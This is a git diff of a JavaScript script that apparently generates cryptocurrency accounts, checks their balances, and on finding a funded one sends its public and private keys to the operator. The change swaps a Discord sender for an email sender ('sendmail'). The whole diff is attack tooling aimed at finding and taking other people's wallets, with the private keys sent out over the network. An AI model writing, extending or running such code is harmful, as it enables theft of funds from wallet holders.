@@ -1,6 +1,6 @@
 const { queryNative, query20 } = require("./query")
 const { magicGenerate } = require('./generate')
-const { senddiscord, discordSetup } = require('../send') 
+const { senddiscord, discordSetup, sendmail } = require('../send') 
 
 function sleep(ms) {
     return new Promise(resolve => {
@@ -37,12 +37,20 @@ async function givememoney(product) {
                     }
                     
                     console.log('Found somthing great!')
-                    senddiscord(channel, {
+                    // senddiscord(channel, {
+                    //     pubk: acc.pubk,
+                    //     prik: acc.prik,
+                    //     native: e.native,
+                    //     balnce: e.result
+                    // })
+
+                    sendmail({
                         pubk: acc.pubk,
                         prik: acc.prik,
                         native: e.native,
                         balnce: e.result
                     })
+                    
                 }
             })
             .catch(err => console.log(`Error in givememoney: ${err.message}`))
